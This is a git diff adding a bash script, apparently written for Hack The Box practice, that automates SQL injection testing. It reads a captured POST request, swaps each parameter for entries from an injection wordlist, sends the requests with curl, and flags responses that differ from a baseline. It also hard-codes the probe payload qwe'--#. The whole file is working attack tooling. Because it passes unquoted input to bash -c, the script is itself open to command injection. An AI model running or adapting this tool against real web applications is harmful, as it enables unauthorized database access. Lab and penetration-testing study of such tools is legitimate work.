@@ -1,0 +1,100 @@
+#!/bin/bash
+# SQL injector with curl
+
+#DEFAULT VALUES
+wordlist="wordlist_sqli.txt"
+url="http://test.htb"
+curl_file="post.curl"
+curl_time=20
+
+fake_data="us=qwe1&ass=pass"
+original_data=$fake_data
+
+## FUNCTIONS :
+start_basq() {
+
+    echo "[+] starting the basq - $url"
+    arguments_count=$(echo "$original_data" | grep "&" | grep -c .)
+    echo "[+] dry run"
+    fake_value=$(bash -c "curl --silent $url --data-raw $fake_data" 2> /dev/null| md5sum)
+    #echo "[*] fake MD5: $fake_value"
+    default_value=$(bash -c "curl --silent $url --data-raw $original_data"| md5sum)
+    #echo "[*] default MD5: $default_value"
+}
+
+run_payload() {
+    local current_argument=$1
+    while read -r Line
+    do
+        new_Line=$(echo "$Line" | sed -r 's/"/\\"/g' )  # This needs workaround,  testing ... 
+        IFS='&' read -ra my_array <<< "$original_data"
+
+        command_i=$(echo "${my_array[$current_argument]}" | cut -d= -f1)
+        command_ii=$command_i=$new_Line
+        my_array[current_argument]="$command_ii"
+
+        # command_iii=$(echo "${my_array[@]}" | sed 's/ /\&/g' )
+        command_iii=$(IFS='&';echo "${my_array[*]}";IFS=$' \t\n')
+        # echo $command_iii
+        
+        res=$(bash -c "curl --max-time $curl_time --silent  $url --data-raw $command_iii" 2> /dev/null| md5sum)
+        if [ "$res" != "$default_value" ] && [ "$res" != "$fake_value" ] && [ "$res" != "$quoted_value" ]
+        then
+            echo "[*] inspect parameter <$command_i>: $Line"
+        fi	
+    done < $wordlist
+}
+
+#Main loop
+main_func(){
+    start_basq
+    for (( i=0; i<=arguments_count; i++ ))
+    do  
+        ## Dynamic runs : qwe'--#
+        quoted_data1=$(echo "$original_data" |cut -d\& -f$((i+1)) | cut -d= -f2)
+        quoted_data2=$(echo "$original_data" | sed "s/$quoted_data1/qwe'--#/")
+        quoted_value=$(bash -c "curl --silent $url --data-raw $quoted_data2" 2> /dev/null| md5sum)
+        #echo "[*] simple quote MD5: $quoted_value"
+
+        echo "[+] Injecting argument $((i+1)):"
+        run_payload $i
+    done
+    echo "[+] done"
+}
+
+read_file(){
+    ## Read curl request file
+    original_data=$(cat $curl_file | grep -oe "--data-raw .*" | cut -d" " -f2)
+    url=$(cat $curl_file | grep -Eo "([\'\"]http?://)\S+"  | head -1)  # Extended regex
+    # TODO: add headers in version 2.0
+}
+
+usage_help(){
+    echo "Usage::"
+    echo "-w <wordlist file>"
+    echo "-r <curl request file> you can get it from browser"
+    echo "-u <url to inject http://something>"
+    echo "-t <curl --max-time setting>" # no threads
+    echo "-a < arguments separated with & and with values set with = >"
+    echo "-h print this help"
+    exit 1
+}
+
+## GETOPTS::
+while getopts a:u:w:t:r:h flag
+do
+    case "${flag}" in
+        a) original_data=${OPTARG};;
+        u) url=${OPTARG};;
+        t) curl_time=${OPTARG};;
+        r) 
+            curl_file=${OPTARG}
+            read_file
+            ;;
+        w) wordlist=${OPTARG};;
+        h) usage_help;;
+        *) usage_help;;
+     esac
+done
+
+main_func
